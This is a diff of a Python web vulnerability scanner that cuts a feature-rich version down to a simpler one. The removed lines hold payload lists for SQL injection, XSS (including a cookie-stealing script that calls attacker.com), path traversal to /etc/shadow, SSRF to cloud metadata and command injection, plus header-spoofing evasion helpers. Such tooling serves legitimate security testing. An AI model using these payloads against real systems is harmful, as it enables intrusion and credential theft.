@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 """
-HackPrevent Enterprise Web Vulnerability Scanner v2.0
-Advanced Professional Security Analysis Platform
+HackPrevent Web Vulnerability Scanner - Fixed Version
+Professional external security analysis tool
 Author: Javier Bogado - HackPrevent
 Date: 2025-09-03
-License: Enterprise Grade Security Tool
 """
 
 import requests
@@ -12,354 +11,106 @@ import ssl
 import socket
 import json
 import time
-import threading
+import urllib3
 import subprocess
 import sys
 import os
-import re
-import random
-import base64
-import hashlib
-import urllib.parse
-from urllib.parse import urljoin, urlparse, parse_qs, quote
-from datetime import datetime, timedelta
+from urllib.parse import urljoin, urlparse
+from datetime import datetime
 import argparse
 import warnings
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import platform
-import itertools
-import xml.etree.ElementTree as ET
-from pathlib import Path
+import traceback
 
-# Advanced imports for enterprise features
-try:
-    import dns.resolver
-    import whois
-    from selenium import webdriver
-    from selenium.webdriver.chrome.options import Options
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.support import expected_conditions as EC
-    DNS_AVAILABLE = True
-    SELENIUM_AVAILABLE = True
-except ImportError:
-    DNS_AVAILABLE = False
-    SELENIUM_AVAILABLE = False
-
-# Suppress warnings
+# Suppress SSL warnings
 warnings.filterwarnings('ignore', message='Unverified HTTPS request')
-warnings.filterwarnings('ignore', category=DeprecationWarning)
+warnings.filterwarnings('ignore', category=urllib3.exceptions.InsecureRequestWarning)
 
 try:
     from bs4 import BeautifulSoup
     from colorama import init, Fore, Back, Style
     from tqdm import tqdm
-    import yaml
 except ImportError:
-    print("🚀 Installing required enterprise dependencies...")
+    print("🚀 Installing required dependencies...")
     subprocess.check_call([sys.executable, "-m", "pip", "install", 
-                          "beautifulsoup4", "colorama", "tqdm", "requests", 
-                          "pyyaml", "dnspython", "python-whois", "selenium"])
+                          "beautifulsoup4", "colorama", "tqdm"])
     from bs4 import BeautifulSoup
     from colorama import init, Fore, Back, Style
     from tqdm import tqdm
-    import yaml
 
 init(autoreset=True)
 
-class EnterpriseWebVulnScanner:
-    """Enterprise-Grade Web Vulnerability Scanner with Advanced Detection"""
+class HackPreventScanner:
+    """Fixed Professional Web Vulnerability Scanner"""
     
-    def __init__(self, target_url, threads=15, aggressive=False, deep_scan=False):
+    def __init__(self, target_url, threads=10):
         self.target_url = target_url.rstrip('/')
         self.domain = urlparse(target_url).netloc
-        self.base_domain = self.extract_base_domain(self.domain)
         self.threads = threads
-        self.aggressive = aggressive
-        self.deep_scan = deep_scan
         self.session = requests.Session()
         
-        # Advanced session configuration
-        self.setup_advanced_session()
+        # Configure session with error handling
+        self.setup_session()
         
-        # Enterprise data structures
         self.vulnerabilities = []
-        self.discovered_endpoints = set()
-        self.discovered_parameters = set()
-        self.forms_data = []
-        self.cookies_analysis = {}
-        self.waf_detected = False
-        self.waf_type = None
-        
-        # Scan results structure
         self.scan_results = {
-            'metadata': {
-                'target': target_url,
-                'scan_date': datetime.now().isoformat(),
-                'scanner_version': 'HackPrevent Enterprise v2.0',
-                'scan_type': 'deep' if deep_scan else 'standard',
-                'aggressive_mode': aggressive,
-                'scanner_os': f"{platform.system()} {platform.release()}",
-                'operator': 'jbogad'
-            },
-            'reconnaissance': {
-                'dns_analysis': {},
-                'whois_data': {},
-                'subdomain_enumeration': [],
-                'technology_fingerprinting': {},
-                'waf_detection': {}
-            },
-            'infrastructure_analysis': {
-                'ssl_analysis': {},
-                'security_headers': {},
-                'server_analysis': {},
-                'port_scan_results': {}
-            },
-            'application_security': {
-                'injection_vulnerabilities': [],
-                'xss_vulnerabilities': [],
-                'authentication_issues': [],
-                'authorization_flaws': [],
-                'session_management': {},
-                'file_inclusion_vulns': [],
-                'business_logic_flaws': []
-            },
-            'advanced_testing': {
-                'api_security': {},
-                'client_side_security': {},
-                'websocket_analysis': {},
-                'graphql_testing': {}
-            },
-            'risk_assessment': {
-                'overall_risk_score': 0,
-                'compliance_status': {},
-                'executive_summary': {},
-                'remediation_roadmap': []
-            }
+            'target': target_url,
+            'scan_date': datetime.now().isoformat(),
+            'scanner_version': 'HackPrevent Fixed v1.1',
+            'vulnerabilities': [],
+            'summary': {}
         }
-        
-        # Load payloads and wordlists
-        self.load_payloads()
     
-    def extract_base_domain(self, domain):
-        """Extract base domain from subdomain"""
-        parts = domain.split('.')
-        if len(parts) >= 2:
-            return '.'.join(parts[-2:])
-        return domain
+    def setup_session(self):
+        """Setup session with proper error handling"""
+        try:
+            self.session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'keep-alive'
+            })
+            
+            # Disable SSL warnings
+            import urllib3
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+            
+            # Set timeouts and retries
+            self.session.verify = False
+            self.session.timeout = 10
+            
+        except Exception as e:
+            print(f"⚠️  Session setup warning: {e}")
     
-    def setup_advanced_session(self):
-        """Configure advanced session with evasion techniques"""
-        # Rotating User-Agents for evasion
-        self.user_agents = [
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
-        ]
-        
-        self.session.headers.update({
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Cache-Control': 'max-age=0'
-        })
-        
-        # Advanced session configuration
-        self.session.max_redirects = 10
-        self.session.verify = False
-        
-        # Custom adapter for retry logic
-        from requests.adapters import HTTPAdapter
-        from urllib3.util.retry import Retry
-        
-        retry_strategy = Retry(
-            total=3,
-            backoff_factor=1,
-            status_forcelist=[429, 500, 502, 503, 504],
-        )
-        adapter = HTTPAdapter(max_retries=retry_strategy)
-        self.session.mount("http://", adapter)
-        self.session.mount("https://", adapter)
-    
-    def load_payloads(self):
-        """Load comprehensive payload databases"""
-        # SQL Injection payloads
-        self.sql_payloads = [
-            "'", "''", "\"", "\"\"", "`", "``",
-            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
-            "admin'--", "admin'#", "admin'/*", "') OR ('1'='1",
-            "1' UNION SELECT NULL--", "1' UNION SELECT 1,2,3--",
-            "'; EXEC xp_cmdshell('dir')--", "'; EXEC sp_configure 'show advanced options', 1--",
-            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
-            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
-            "1' WAITFOR DELAY '0:0:5'--", "1'; WAITFOR DELAY '0:0:5'--",
-            "1' OR SLEEP(5)--", "1' OR pg_sleep(5)--",
-            "1'||UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))||'",
-            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--"
-        ]
-        
-        # XSS payloads
-        self.xss_payloads = [
-            "<script>alert('XSS')</script>",
-            "<script>alert(document.domain)</script>",
-            "<script>alert(document.cookie)</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "<iframe src=javascript:alert('XSS')>",
-            "<body onload=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>",
-            "<select onfocus=alert('XSS') autofocus>",
-            "'\"><script>alert('XSS')</script>",
-            "\"><script>alert('XSS')</script>",
-            "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
-            "<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>",
-            "';alert('XSS');//", "\";alert('XSS');//",
-            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
-        ]
-        
-        # LFI/Path Traversal payloads
-        self.lfi_payloads = [
-            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/group",
-            "/proc/version", "/proc/self/environ", "/proc/self/cmdline",
-            "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
-            "..%252f..%252f..%252fetc%252fpasswd", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
-            "file:///etc/passwd", "file://c:/windows/system32/drivers/etc/hosts",
-            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B",
-            "expect://id", "zip://test.zip%23shell.php", "phar://test.phar/shell.php"
-        ]
-        
-        # SSRF payloads
-        self.ssrf_payloads = [
-            "http://localhost", "http://127.0.0.1", "http://0.0.0.0",
-            "http://[::1]", "http://localhost:22", "http://localhost:3306",
-            "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/",
-            "file:///etc/passwd", "file://c:/windows/system32/drivers/etc/hosts",
-            "gopher://127.0.0.1:25/", "dict://127.0.0.1:11211/",
-            "ldap://127.0.0.1", "sftp://127.0.0.1"
-        ]
-        
-        # Command Injection payloads
-        self.command_payloads = [
-            "; id;", "| id", "& id &", "&& id", "|| id",
-            "; cat /etc/passwd;", "| cat /etc/passwd", "& cat /etc/passwd &",
-            "; ping -c 4 127.0.0.1;", "| ping -c 4 127.0.0.1", 
-            "; sleep 5;", "| sleep 5", "& sleep 5 &",
-            "`id`", "$(id)", "${id}", "$[id]",
-            "%0aid", "%0a%0did", "%0d%0aid", "%0d%0a%0did"
-        ]
-        
-        # Directory/file wordlists
-        self.directory_wordlist = [
-            # Admin panels
-            'admin', 'administrator', 'wp-admin', 'adminpanel', 'control', 'cpanel',
-            'manager', 'management', 'moderator', 'webadmin', 'adminarea', 'bb-admin',
-            'adminLogin', 'admin_area', 'panel-administracion', 'instadmin',
-            
-            # Configuration files
-            'config', 'configuration', 'settings', 'setup', 'install', 'installation',
-            '.env', '.config', 'config.php', 'config.json', 'web.config', 'app.config',
-            'database.yml', 'secrets.yml', 'parameters.yml', 'config.yml',
-            
-            # Backup files
-            'backup', 'backups', 'bak', 'old', 'orig', 'copy', 'archive',
-            'backup.sql', 'database.sql', 'dump.sql', 'backup.tar.gz',
-            'backup.zip', 'site-backup.zip', 'db_backup.sql',
-            
-            # Development/Testing
-            'test', 'testing', 'dev', 'development', 'staging', 'demo',
-            'beta', 'alpha', 'qa', 'uat', 'preprod', 'preview',
-            'sandbox', 'pilot', 'experimental',
-            
-            # Version control
-            '.git', '.svn', '.hg', '.bzr', 'CVS', '.git/config', '.git/HEAD',
-            '.git/logs/HEAD', '.svn/entries', '.svn/wc.db',
-            
-            # API endpoints
-            'api', 'api/v1', 'api/v2', 'rest', 'restapi', 'webservice',
-            'ws', 'service', 'services', 'graphql', 'apollo',
-            
-            # File uploads
-            'upload', 'uploads', 'files', 'file', 'documents', 'docs',
-            'images', 'img', 'pictures', 'pics', 'assets', 'static',
-            'media', 'attachments', 'download', 'downloads',
-            
-            # Logs and monitoring
-            'logs', 'log', 'access.log', 'error.log', 'debug.log',
-            'app.log', 'application.log', 'system.log', 'audit.log',
-            'phpmyadmin', 'pma', 'mysql', 'adminer', 'phpinfo.php',
-            
-            # Common files
-            'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
-            'humans.txt', 'security.txt', '.well-known', '.well-known/security.txt',
-            'favicon.ico', 'apple-touch-icon.png', 'browserconfig.xml',
-            
-            # CMS specific
-            'wp-content', 'wp-includes', 'wp-config.php', 'xmlrpc.php',
-            'wp-json', 'readme.html', 'license.txt', 'changelog.txt'
-        ]
-    
-    def rotate_user_agent(self):
-        """Rotate User-Agent for evasion"""
-        self.session.headers['User-Agent'] = random.choice(self.user_agents)
-    
-    def add_random_headers(self):
-        """Add random headers for evasion"""
-        headers = {}
-        if random.choice([True, False]):
-            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-        if random.choice([True, False]):
-            headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-        if random.choice([True, False]):
-            headers['X-Originating-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-        return headers
-    
-    def print_enterprise_banner(self):
-        """Display enterprise scanner banner"""
+    def print_banner(self):
+        """Display scanner banner"""
         banner = f"""
-{Fore.CYAN}╭{'━' * 80}╮
-{Fore.CYAN}┃{Fore.YELLOW}  🛡️  HACKPREVENT ENTERPRISE SECURITY SCANNER v2.0{' ' * 25}┃
-{Fore.CYAN}┃{Fore.GREEN}     Advanced Professional Vulnerability Assessment Platform{' ' * 18}┃
-{Fore.CYAN}┃{' ' * 80}┃
-{Fore.CYAN}┃{Fore.WHITE}  🎯 Target: {self.target_url:<60}┃
-{Fore.CYAN}┃{Fore.WHITE}  🔍 Scan Type: {'Deep Scan' if self.deep_scan else 'Standard Scan':<55}┃
-{Fore.CYAN}┃{Fore.WHITE}  ⚡ Mode: {'Aggressive' if self.aggressive else 'Stealth':<63}┃
-{Fore.CYAN}┃{Fore.WHITE}  👤 Operator: jbogad{' ' * 57}┃
-{Fore.CYAN}┃{Fore.WHITE}  📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC'):<64}┃
-{Fore.CYAN}┃{Fore.WHITE}  🖥️  System: {platform.system()} {platform.release():<55}┃
-{Fore.CYAN}╰{'━' * 80}╯{Style.RESET_ALL}
+{Fore.CYAN}╭{'─' * 70}╮
+{Fore.CYAN}│{Fore.YELLOW}  🛡️  HACKPREVENT WEB SCANNER v1.1 - FIXED{' ' * 17}│
+{Fore.CYAN}│{Fore.GREEN}  Professional Security Analysis Tool{' ' * 23}│
+{Fore.CYAN}│{' ' * 70}│
+{Fore.CYAN}│{Fore.WHITE}  🎯 Target: {self.target_url:<50}│
+{Fore.CYAN}│{Fore.WHITE}  👤 Operator: jbogad{' ' * 43}│
+{Fore.CYAN}│{Fore.WHITE}  📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<50}│
+{Fore.CYAN}╰{'─' * 70}╯{Style.RESET_ALL}
         """
         print(banner)
     
-    def log_vulnerability(self, category, vuln_type, severity, description, evidence="", 
-                         recommendation="", cve_reference="", owasp_category=""):
-        """Enhanced vulnerability logging with enterprise details"""
+    def log_vulnerability(self, vuln_type, severity, description, evidence="", recommendation=""):
+        """Log discovered vulnerabilities"""
         vuln = {
-            'id': f"HP-{len(self.vulnerabilities)+1:04d}",
-            'category': category,
             'type': vuln_type,
             'severity': severity,
             'description': description,
             'evidence': evidence,
             'recommendation': recommendation,
-            'cve_reference': cve_reference,
-            'owasp_category': owasp_category,
-            'timestamp': datetime.now().isoformat(),
-            'confidence': self.calculate_confidence(evidence),
-            'exploitability': self.assess_exploitability(vuln_type, evidence)
+            'timestamp': datetime.now().isoformat()
         }
         self.vulnerabilities.append(vuln)
         
-        # Enhanced console output
+        # Console output
         severity_emoji = {
             'CRITICAL': '🔴',
             'HIGH': '🟠', 
@@ -379,948 +130,378 @@ class EnterpriseWebVulnScanner:
         emoji = severity_emoji.get(severity, '⚪')
         color = color_map.get(severity, Fore.WHITE)
         
-        print(f"{color}{emoji} [HP-{len(self.vulnerabilities):04d}] [{severity}] {category} - {vuln_type}")
-        print(f"   📝 {description}")
+        print(f"{color}{emoji} [{severity}] {vuln_type}: {description}{Style.RESET_ALL}")
         if evidence:
-            print(f"   🔍 Evidence: {evidence[:100]}...")
-        if cve_reference:
-            print(f"   🆔 CVE: {cve_reference}")
-        print(f"{Style.RESET_ALL}")
+            print(f"   🔍 Evidence: {evidence[:80]}...")
     
-    def calculate_confidence(self, evidence):
-        """Calculate confidence level based on evidence"""
-        if not evidence:
-            return "LOW"
-        if len(evidence) > 100 and any(keyword in evidence.lower() for keyword in ['error', 'exception', 'stack trace', 'syntax']):
-            return "HIGH"
-        if len(evidence) > 50:
-            return "MEDIUM"
-        return "LOW"
-    
-    def assess_exploitability(self, vuln_type, evidence):
-        """Assess exploitability level"""
-        high_exploitability = ['SQL Injection', 'Command Injection', 'File Upload', 'RCE']
-        medium_exploitability = ['XSS', 'CSRF', 'LFI', 'SSRF']
-        
-        if any(high_type in vuln_type for high_type in high_exploitability):
-            return "HIGH"
-        elif any(medium_type in vuln_type for medium_type in medium_exploitability):
-            return "MEDIUM"
-        else:
-            return "LOW"
-    
-    def advanced_reconnaissance(self):
-        """Comprehensive reconnaissance phase"""
-        print(f"\n{Fore.BLUE}🕵️  Starting Advanced Reconnaissance...{Style.RESET_ALL}")
-        
-        # DNS Analysis
-        self.dns_analysis()
-        
-        # WHOIS Lookup
-        self.whois_analysis()
-        
-        # Subdomain Enumeration
-        self.subdomain_enumeration()
-        
-        # Technology Fingerprinting
-        self.advanced_fingerprinting()
-        
-        # WAF Detection
-        self.waf_detection()
-    
-    def dns_analysis(self):
-        """Advanced DNS analysis"""
-        if not DNS_AVAILABLE:
-            return
-        
-        print(f"{Fore.CYAN}🌐 Performing DNS analysis...{Style.RESET_ALL}")
-        
-        dns_results = {}
-        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
+    def check_connectivity(self):
+        """Check target connectivity with robust error handling"""
+        print(f"\n{Fore.BLUE}🌐 Checking target connectivity...{Style.RESET_ALL}")
         
         try:
-            for record_type in record_types:
-                try:
-                    answers = dns.resolver.resolve(self.domain, record_type)
-                    dns_results[record_type] = [str(answer) for answer in answers]
-                    print(f"  {record_type}: {', '.join(dns_results[record_type][:3])}")
-                except Exception:
-                    dns_results[record_type] = []
+            # First try HEAD request
+            response = self.session.head(self.target_url, timeout=15, allow_redirects=True)
+            print(f"{Fore.GREEN}✅ HEAD request successful: {response.status_code}")
             
-            # Check for zone transfer vulnerability
-            try:
-                ns_servers = dns_results.get('NS', [])
-                for ns in ns_servers[:2]:  # Check first 2 NS servers
-                    try:
-                        zone = dns.zone.from_xfr(dns.query.xfr(ns, self.domain))
-                        if zone:
-                            self.log_vulnerability("DNS Security", "Zone Transfer", "HIGH",
-                                                 f"DNS Zone Transfer possible on {ns}",
-                                                 f"NS Server: {ns}",
-                                                 "Restrict zone transfer to authorized servers",
-                                                 "", "A9:2017-Security Misconfiguration")
-                    except Exception:
-                        pass
-            except Exception:
-                pass
+            # Then try GET request
+            response = self.session.get(self.target_url, timeout=15, allow_redirects=True)
+            server = response.headers.get('server', 'Unknown')
+            powered_by = response.headers.get('x-powered-by', 'Unknown')
             
-            self.scan_results['reconnaissance']['dns_analysis'] = dns_results
+            print(f"{Fore.GREEN}✅ Target is reachable")
+            print(f"{Fore.GREEN}✅ Status Code: {response.status_code}")
+            print(f"{Fore.GREEN}✅ Server: {server}")
+            if powered_by != 'Unknown':
+                print(f"{Fore.GREEN}✅ Powered by: {powered_by}")
+            
+            # Basic tech detection
+            self.basic_tech_detection(response)
+            
+            return True
+            
+        except requests.exceptions.Timeout:
+            self.log_vulnerability("Connectivity", "CRITICAL", "Request timeout - target may be slow or unreachable")
+            return False
+        except requests.exceptions.ConnectionError as e:
+            self.log_vulnerability("Connectivity", "CRITICAL", f"Connection error: {str(e)}")
+            return False
+        except Exception as e:
+            self.log_vulnerability("Connectivity", "CRITICAL", f"Cannot reach target: {str(e)}")
+            return False
+    
+    def basic_tech_detection(self, response):
+        """Basic technology detection"""
+        print(f"\n{Fore.BLUE}🔍 Basic technology detection...{Style.RESET_ALL}")
+        
+        try:
+            content = response.text.lower()
+            headers = response.headers
+            
+            # Server detection
+            server = headers.get('server', '').lower()
+            if 'nginx' in server:
+                print(f"{Fore.CYAN}🔧 Detected: Nginx Web Server")
+            elif 'apache' in server:
+                print(f"{Fore.CYAN}🔧 Detected: Apache Web Server")
+            elif 'iis' in server:
+                print(f"{Fore.CYAN}🔧 Detected: Microsoft IIS")
+            
+            # PHP detection
+            powered_by = headers.get('x-powered-by', '')
+            if 'php' in powered_by.lower():
+                print(f"{Fore.CYAN}🔧 Detected: {powered_by}")
+            
+            # CMS detection
+            if 'joomla' in content or '/administrator/' in content:
+                print(f"{Fore.CYAN}🔧 Detected: Joomla CMS")
+            elif 'wordpress' in content or '/wp-content/' in content:
+                print(f"{Fore.CYAN}🔧 Detected: WordPress CMS")
+            elif 'drupal' in content:
+                print(f"{Fore.CYAN}🔧 Detected: Drupal CMS")
             
         except Exception as e:
-            print(f"  ⚠️  DNS analysis failed: {str(e)}")
+            print(f"  ⚠️  Tech detection error: {e}")
     
-    def whois_analysis(self):
-        """WHOIS information gathering"""
+    def security_headers_analysis(self):
+        """Security headers analysis with error handling"""
+        print(f"\n{Fore.BLUE}🛡️  Analyzing security headers...{Style.RESET_ALL}")
+        
         try:
-            print(f"{Fore.CYAN}📋 Gathering WHOIS information...{Style.RESET_ALL}")
+            response = self.session.get(self.target_url, timeout=15)
+            headers = {k.lower(): v for k, v in response.headers.items()}
             
-            import whois as whois_module
-            w = whois_module.whois(self.domain)
-            
-            whois_data = {
-                'domain_name': getattr(w, 'domain_name', 'Unknown'),
-                'registrar': getattr(w, 'registrar', 'Unknown'),
-                'creation_date': str(getattr(w, 'creation_date', 'Unknown')),
-                'expiration_date': str(getattr(w, 'expiration_date', 'Unknown')),
-                'name_servers': getattr(w, 'name_servers', []),
-                'org': getattr(w, 'org', 'Unknown'),
-                'country': getattr(w, 'country', 'Unknown')
+            security_headers = {
+                'strict-transport-security': {
+                    'description': 'HTTPS enforcement',
+                    'severity': 'HIGH',
+                    'recommendation': 'Implement HSTS'
+                },
+                'content-security-policy': {
+                    'description': 'Content injection protection',
+                    'severity': 'HIGH', 
+                    'recommendation': 'Implement CSP'
+                },
+                'x-frame-options': {
+                    'description': 'Clickjacking protection',
+                    'severity': 'MEDIUM',
+                    'recommendation': 'Set X-Frame-Options'
+                },
+                'x-content-type-options': {
+                    'description': 'MIME sniffing protection',
+                    'severity': 'MEDIUM',
+                    'recommendation': 'Set to nosniff'
+                },
+                'x-xss-protection': {
+                    'description': 'XSS protection',
+                    'severity': 'MEDIUM',
+                    'recommendation': 'Enable XSS protection'
+                }
             }
             
-            # Check for domain expiration
-            if hasattr(w, 'expiration_date') and w.expiration_date:
-                exp_date = w.expiration_date
-                if isinstance(exp_date, list):
-                    exp_date = exp_date[0]
-                
-                if isinstance(exp_date, datetime):
-                    days_until_expiry = (exp_date - datetime.now()).days
-                    if days_until_expiry < 90:
-                        self.log_vulnerability("Domain Management", "Domain Expiration", "MEDIUM",
-                                             f"Domain expires in {days_until_expiry} days",
-                                             f"Expiration: {exp_date}",
-                                             "Renew domain registration before expiration")
+            present_count = 0
+            total_count = len(security_headers)
             
-            self.scan_results['reconnaissance']['whois_data'] = whois_data
-            print(f"  🏢 Organization: {whois_data['org']}")
-            print(f"  📅 Expires: {whois_data['expiration_date']}")
+            for header, info in security_headers.items():
+                if header in headers:
+                    present_count += 1
+                    print(f"{Fore.GREEN}✅ {header}: {headers[header][:50]}...")
+                else:
+                    self.log_vulnerability("Missing Security Header", info['severity'],
+                                         f"Missing {header} header",
+                                         f"Header: {header}",
+                                         info['recommendation'])
+            
+            score = (present_count / total_count) * 100
+            print(f"{Fore.YELLOW}📊 Security Headers Score: {score:.1f}% ({present_count}/{total_count})")
             
         except Exception as e:
-            print(f"  ⚠️  WHOIS lookup failed: {str(e)}")
+            self.log_vulnerability("Header Analysis", "LOW", f"Header analysis failed: {str(e)}")
     
-    def subdomain_enumeration(self):
-        """Advanced subdomain enumeration"""
-        print(f"{Fore.CYAN}🔍 Enumerating subdomains...{Style.RESET_ALL}")
+    def basic_directory_scan(self):
+        """Basic directory enumeration"""
+        print(f"\n{Fore.BLUE}📁 Basic directory enumeration...{Style.RESET_ALL}")
         
-        subdomains = []
-        common_subdomains = [
-            'www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging',
-            'blog', 'shop', 'store', 'support', 'help', 'docs', 'portal',
-            'dashboard', 'panel', 'secure', 'vpn', 'remote', 'backup',
-            'old', 'new', 'beta', 'alpha', 'demo', 'sandbox', 'mobile',
-            'app', 'apps', 'service', 'services', 'webmail', 'email',
-            'pop', 'imap', 'smtp', 'ns1', 'ns2', 'dns', 'mx', 'mx1', 'mx2'
+        common_paths = [
+            '/admin', '/administrator', '/wp-admin', '/login',
+            '/phpmyadmin', '/cpanel', '/config', '/backup',
+            '/robots.txt', '/sitemap.xml', '/.git', '/.env',
+            '/test', '/dev', '/api', '/upload'
         ]
         
-        def check_subdomain(subdomain):
+        found_paths = []
+        
+        for path in common_paths:
             try:
-                full_domain = f"{subdomain}.{self.base_domain}"
-                response = self.session.get(f"http://{full_domain}", timeout=5, verify=False)
-                if response.status_code != 404:
-                    return full_domain
-            except Exception:
-                pass
-            return None
-        
-        with ThreadPoolExecutor(max_workers=20) as executor:
-            future_to_subdomain = {executor.submit(check_subdomain, sub): sub for sub in common_subdomains}
-            
-            for future in as_completed(future_to_subdomain):
-                result = future.result()
-                if result:
-                    subdomains.append(result)
-                    print(f"  ✅ Found: {result}")
-        
-        self.scan_results['reconnaissance']['subdomain_enumeration'] = subdomains
-        
-        if len(subdomains) > 10:
-            self.log_vulnerability("Information Disclosure", "Subdomain Enumeration", "INFO",
-                                 f"Large number of subdomains discovered: {len(subdomains)}",
-                                 f"Subdomains: {', '.join(subdomains[:5])}...",
-                                 "Review subdomain exposure and implement proper access controls")
-    
-    def advanced_fingerprinting(self):
-        """Advanced technology fingerprinting"""
-        print(f"{Fore.CYAN}🔧 Advanced technology fingerprinting...{Style.RESET_ALL}")
-        
-        try:
-            self.rotate_user_agent()
-            response = self.session.get(self.target_url, timeout=15, verify=False)
-            
-            technologies = {
-                'web_server': self.detect_web_server(response),
-                'cms': self.detect_cms(response),
-                'frameworks': self.detect_frameworks(response),
-                'languages': self.detect_languages(response),
-                'databases': self.detect_databases(response),
-                'cdn': self.detect_cdn(response),
-                'analytics': self.detect_analytics(response),
-                'security_products': self.detect_security_products(response)
-            }
-            
-            self.scan_results['reconnaissance']['technology_fingerprinting'] = technologies
-            
-            # Print findings
-            for category, items in technologies.items():
-                if items:
-                    print(f"  🔧 {category.replace('_', ' ').title()}: {', '.join(items)}")
-            
-        except Exception as e:
-            print(f"  ⚠️  Fingerprinting failed: {str(e)}")
-    
-    def detect_web_server(self, response):
-        """Detect web server technology"""
-        servers = []
-        server_header = response.headers.get('Server', '').lower()
-        
-        server_signatures = {
-            'apache': ['apache'],
-            'nginx': ['nginx'],
-            'iis': ['microsoft-iis', 'iis'],
-            'lighttpd': ['lighttpd'],
-            'tomcat': ['tomcat'],
-            'jetty': ['jetty'],
-            'cloudflare': ['cloudflare'],
-            'aws': ['aws', 'amazon']
-        }
-        
-        for server_type, signatures in server_signatures.items():
-            if any(sig in server_header for sig in signatures):
-                servers.append(server_type)
-        
-        return servers
-    
-    def detect_cms(self, response):
-        """Detect Content Management Systems"""
-        cms_list = []
-        content = response.text.lower()
-        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
-        
-        cms_signatures = {
-            'wordpress': ['/wp-content/', '/wp-includes/', 'wp-json', 'wordpress'],
-            'drupal': ['/sites/default/', '/modules/', '/themes/', 'drupal'],
-            'joomla': ['/administrator/', '/components/', '/templates/', 'joomla'],
-            'magento': ['/skin/frontend/', '/js/mage/', 'magento'],
-            'prestashop': ['/modules/prestashop/', 'prestashop'],
-            'shopify': ['shopify', 'myshopify.com'],
-            'typo3': ['typo3', '/typo3/'],
-            'concrete5': ['concrete5', '/concrete/'],
-            'modx': ['modx', '/manager/'],
-            'umbraco': ['umbraco', '/umbraco/']
-        }
-        
-        for cms, signatures in cms_signatures.items():
-            if any(sig in content for sig in signatures):
-                cms_list.append(cms)
-        
-        return cms_list
-    
-    def detect_frameworks(self, response):
-        """Detect web frameworks"""
-        frameworks = []
-        content = response.text.lower()
-        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
-        
-        framework_signatures = {
-            'react': ['react', '_react', 'reactjs'],
-            'angular': ['angular', 'ng-', 'angularjs'],
-            'vue': ['vue.js', 'vue', '_vue'],
-            'jquery': ['jquery', 'jquery.min.js'],
-            'bootstrap': ['bootstrap', 'bootstrap.min.css'],
-            'django': ['django', 'csrftoken'],
-            'flask': ['flask'],
-            'express': ['express'],
-            'laravel': ['laravel', 'laravel_session'],
-            'codeigniter': ['codeigniter'],
-            'symfony': ['symfony'],
-            'spring': ['spring', 'jsessionid'],
-            'asp.net': ['asp.net', '__viewstate', '__eventvalidation']
-        }
-        
-        for framework, signatures in framework_signatures.items():
-            if any(sig in content for sig in signatures):
